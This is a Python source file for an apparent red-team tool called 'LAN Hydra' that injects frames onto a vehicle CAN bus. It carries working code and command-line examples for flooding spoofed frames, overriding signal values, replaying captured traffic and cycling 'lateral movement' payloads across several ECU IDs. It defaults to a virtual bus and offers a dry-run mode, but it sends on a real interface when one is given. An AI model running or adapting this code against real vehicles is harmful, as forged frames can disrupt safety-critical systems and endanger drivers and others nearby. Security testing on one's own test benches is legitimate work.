# attacks/injection.py
import time
import os
import can
import json
import random
import argparse
from typing import List, Dict, Any, Optional, Union
from utils.can_bus import make_bus

class AdvancedInjector:
    """
    Advanced CAN injection capabilities for red-team testing.
    Supports multiple attack patterns, payload variations, and realistic scenarios.
    """
    
    def __init__(self, bustype: str = "virtual", channel: Optional[str] = None):
        self.bus = make_bus(channel=channel, bustype=bustype)
        self.log_path = os.path.join("data", "injection.log")
        os.makedirs("data", exist_ok=True)
        
    def log_attack(self, attack_type: str, can_id: int, payload: bytes, success: bool):
        """Log attack attempts for analysis"""
        log_entry = {
            "timestamp": time.time(),
            "attack_type": attack_type,
            "can_id": f"0x{can_id:x}",
            "payload": payload.hex(),
            "success": success
        }
        with open(self.log_path, "a") as f:
            f.write(json.dumps(log_entry) + "\n")

    def basic_injection(self, can_id: int, payload: Union[int, bytes], 
                       duration: int, interval: float = 0.1, 
                       dry_run: bool = False) -> None:
        """
        Basic injection attack - continuously send spoofed frames.
        
        Args:
            can_id: CAN ID to inject (hex format supported)
            payload: Single byte value or full payload bytes
            duration: Attack duration in seconds
            interval: Time between injections
            dry_run: If True, only simulate without sending
        """
        if isinstance(can_id, str):
            can_id = int(can_id, 16)
        
        if isinstance(payload, int):
            payload_bytes = bytes([payload & 0xFF])
        else:
            payload_bytes = payload
            
        end_time = time.time() + duration
        attack_type = "basic_injection"
        
        print(f"[{attack_type}] Starting injection: ID=0x{can_id:x}, payload={payload_bytes.hex()}")
        print(f"[{attack_type}] Duration: {duration}s, Interval: {interval}s")
        
        if dry_run:
            print(f"[{attack_type}] DRY RUN MODE - No actual messages sent")
            
        try:
            while time.time() < end_time:
                if not dry_run:
                    msg = can.Message(arbitration_id=can_id, data=payload_bytes, is_extended_id=False)
                    try:
                        self.bus.send(msg)
                        self.log_attack(attack_type, can_id, payload_bytes, True)
                        print(f"Injected: ID=0x{can_id:x} Data={payload_bytes.hex()}")
                    except Exception as e:
                        self.log_attack(attack_type, can_id, payload_bytes, False)
                        print(f"Injection failed: {e}")
                else:
                    print(f"[DRY] Would inject: ID=0x{can_id:x} Data={payload_bytes.hex()}")
                    
                time.sleep(interval)
                
        except KeyboardInterrupt:
            print(f"[{attack_type}] Cancelled by user")
        finally:
            print(f"[{attack_type}] Attack completed")

    def spoofing_attack(self, target_id: int, spoofed_value: int, 
                       original_value: int, duration: int, 
                       interval: float = 0.1, dry_run: bool = False) -> None:
        """
        Spoofing attack - replace legitimate values with malicious ones.
        
        Args:
            target_id: CAN ID to spoof
            spoofed_value: Malicious value to inject
            original_value: Legitimate value being replaced
            duration: Attack duration
            interval: Time between injections
            dry_run: Simulation mode
        """
        if isinstance(target_id, str):
            target_id = int(target_id, 16)
            
        payload_bytes = bytes([spoofed_value & 0xFF])
        end_time = time.time() + duration
        attack_type = "spoofing"
        
        print(f"[{attack_type}] Spoofing ID=0x{target_id:x}: {original_value} -> {spoofed_value}")
        
        try:
            while time.time() < end_time:
                if not dry_run:
                    msg = can.Message(arbitration_id=target_id, data=payload_bytes, is_extended_id=False)
                    try:
                        self.bus.send(msg)
                        self.log_attack(attack_type, target_id, payload_bytes, True)
                        print(f"Spoofed: ID=0x{target_id:x} Value={spoofed_value}")
                    except Exception as e:
                        self.log_attack(attack_type, target_id, payload_bytes, False)
                        print(f"Spoofing failed: {e}")
                else:
                    print(f"[DRY] Would spoof: ID=0x{target_id:x} Value={spoofed_value}")
                    
                time.sleep(interval)
                
        except KeyboardInterrupt:
            print(f"[{attack_type}] Cancelled by user")
        finally:
            print(f"[{attack_type}] Spoofing attack completed")

    def replay_attack(self, log_file: str, duration: int, 
                     speed_multiplier: float = 1.0, dry_run: bool = False) -> None:
        """
        Replay attack - replay captured CAN messages from log file.
        
        Args:
            log_file: Path to CAN message log (JSON format)
            duration: Maximum replay duration
            speed_multiplier: Speed up (>1) or slow down (<1) replay
            dry_run: Simulation mode
        """
        attack_type = "replay"
        
        if not os.path.exists(log_file):
            print(f"[{attack_type}] Error: Log file {log_file} not found")
            return
            
        print(f"[{attack_type}] Replaying messages from {log_file}")
        print(f"[{attack_type}] Speed multiplier: {speed_multiplier}x")
        
        try:
            with open(log_file, 'r') as f:
                messages = [json.loads(line.strip()) for line in f if line.strip()]
                
            if not messages:
                print(f"[{attack_type}] No messages found in log file")
                return
                
            start_time = time.time()
            last_timestamp = messages[0].get('timestamp', start_time)
            
            for i, msg_data in enumerate(messages):
                if time.time() - start_time >= duration:
                    break
                    
                current_timestamp = msg_data.get('timestamp', time.time())
                if i > 0:
                    delay = (current_timestamp - last_timestamp) / speed_multiplier
                    time.sleep(max(0, delay))
                    
                can_id = int(msg_data.get('arbitration_id', 0x100))
                payload_hex = msg_data.get('data', '00')
                payload_bytes = bytes.fromhex(payload_hex)
                
                if not dry_run:
                    msg = can.Message(arbitration_id=can_id, data=payload_bytes, is_extended_id=False)
                    try:
                        self.bus.send(msg)
                        self.log_attack(attack_type, can_id, payload_bytes, True)
                        print(f"Replayed: ID=0x{can_id:x} Data={payload_bytes.hex()}")
                    except Exception as e:
                        self.log_attack(attack_type, can_id, payload_bytes, False)
                        print(f"Replay failed: {e}")
                else:
                    print(f"[DRY] Would replay: ID=0x{can_id:x} Data={payload_bytes.hex()}")
                    
                last_timestamp = current_timestamp
                
        except KeyboardInterrupt:
            print(f"[{attack_type}] Cancelled by user")
        except Exception as e:
            print(f"[{attack_type}] Error: {e}")
        finally:
            print(f"[{attack_type}] Replay attack completed")

    def lateral_movement_attack(self, target_ids: List[int], 
                               payload_pattern: str = "escalate",
                               duration: int = 30, dry_run: bool = False) -> None:
        """
        Lateral movement attack - progressively target different ECUs.
        
        Args:
            target_ids: List of CAN IDs to target progressively
            payload_pattern: Attack pattern ("escalate", "random", "sequential")
            duration: Attack duration
            dry_run: Simulation mode
        """
        attack_type = "lateral_movement"
        
        print(f"[{attack_type}] Targeting {len(target_ids)} ECUs: {[f'0x{id:x}' for id in target_ids]}")
        print(f"[{attack_type}] Pattern: {payload_pattern}")
        
        end_time = time.time() + duration
        current_target = 0
        
        try:
            while time.time() < end_time:
                if current_target >= len(target_ids):
                    current_target = 0  # Cycle through targets
                    
                target_id = target_ids[current_target]
                
                # Generate payload based on pattern
                if payload_pattern == "escalate":
                    payload_value = min(255, 50 + current_target * 20)
                elif payload_pattern == "random":
                    payload_value = random.randint(0, 255)
                else:  # sequential
                    payload_value = current_target * 10
                    
                payload_bytes = bytes([payload_value])
                
                if not dry_run:
                    msg = can.Message(arbitration_id=target_id, data=payload_bytes, is_extended_id=False)
                    try:
                        self.bus.send(msg)
                        self.log_attack(attack_type, target_id, payload_bytes, True)
                        print(f"Lateral: ID=0x{target_id:x} Value={payload_value}")
                    except Exception as e:
                        self.log_attack(attack_type, target_id, payload_bytes, False)
                        print(f"Lateral movement failed: {e}")
                else:
                    print(f"[DRY] Would target: ID=0x{target_id:x} Value={payload_value}")
                    
                current_target += 1
                time.sleep(0.5)  # Slower for lateral movement
                
        except KeyboardInterrupt:
            print(f"[{attack_type}] Cancelled by user")
        finally:
            print(f"[{attack_type}] Lateral movement attack completed")

# Legacy compatibility function
def run(duration: int, value: int, bustype: str = "virtual", 
        channel: Optional[str] = None, period: float = 0.2):
    """Legacy function for backward compatibility"""
    injector = AdvancedInjector(bustype=bustype, channel=channel)
    injector.basic_injection(0x100, value, duration, period)

def main():
    """Enhanced CLI interface"""
    parser = argparse.ArgumentParser(
        description="LAN Hydra Advanced CAN Injection Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Examples:
  Basic injection:     python injection.py --attack basic --id 0x100 --value 220 --duration 10
  Spoofing attack:     python injection.py --attack spoof --id 0x200 --spoof-value 255 --original-value 50 --duration 15
  Replay attack:       python injection.py --attack replay --log-file data/monitor.log --duration 20
  Lateral movement:    python injection.py --attack lateral --targets 0x100,0x200,0x300 --duration 30
  Dry run (safe):      python injection.py --attack basic --id 0x100 --value 220 --duration 5 --dry-run
        """
    )
    
    # Common arguments
    parser.add_argument("--attack", choices=["basic", "spoof", "replay", "lateral"], 
                       required=True, help="Attack type to perform")
    parser.add_argument("--bustype", default="virtual", help="CAN bus type (default: virtual)")
    parser.add_argument("--channel", default=None, help="CAN channel/interface")
    parser.add_argument("--duration", type=int, required=True, help="Attack duration in seconds")
    parser.add_argument("--dry-run", action="store_true", help="Simulate attack without sending messages")
    
    # Basic injection arguments
    parser.add_argument("--id", help="CAN ID (hex format, e.g., 0x100)")
    parser.add_argument("--value", type=int, help="Payload value (0-255)")
    parser.add_argument("--interval", type=float, default=0.1, help="Injection interval in seconds")
    
    # Spoofing arguments
    parser.add_argument("--spoof-value", type=int, help="Malicious value to inject")
    parser.add_argument("--original-value", type=int, help="Original legitimate value")
    
    # Replay arguments
    parser.add_argument("--log-file", help="Path to CAN message log file")
    parser.add_argument("--speed", type=float, default=1.0, help="Replay speed multiplier")
    
    # Lateral movement arguments
    parser.add_argument("--targets", help="Comma-separated list of target CAN IDs")
    parser.add_argument("--pattern", choices=["escalate", "random", "sequential"], 
                       default="escalate", help="Attack pattern")
    
    args = parser.parse_args()
    
    # Create injector
    injector = AdvancedInjector(bustype=args.bustype, channel=args.channel)
    
    # Execute attack based on type
    if args.attack == "basic":
        if not args.id or args.value is None:
            parser.error("Basic attack requires --id and --value")
        injector.basic_injection(args.id, args.value, args.duration, 
                                args.interval, args.dry_run)
        
    elif args.attack == "spoof":
        if not args.id or args.spoof_value is None or args.original_value is None:
            parser.error("Spoof attack requires --id, --spoof-value, and --original-value")
        injector.spoofing_attack(args.id, args.spoof_value, args.original_value,
                                args.duration, args.interval, args.dry_run)
        
    elif args.attack == "replay":
        if not args.log_file:
            parser.error("Replay attack requires --log-file")
        injector.replay_attack(args.log_file, args.duration, args.speed, args.dry_run)
        
    elif args.attack == "lateral":
        if not args.targets:
            parser.error("Lateral movement requires --targets")
        target_ids = [int(id.strip(), 16) for id in args.targets.split(",")]
        injector.lateral_movement_attack(target_ids, args.pattern, 
                                        args.duration, args.dry_run)

if __name__ == "__main__":
    main()
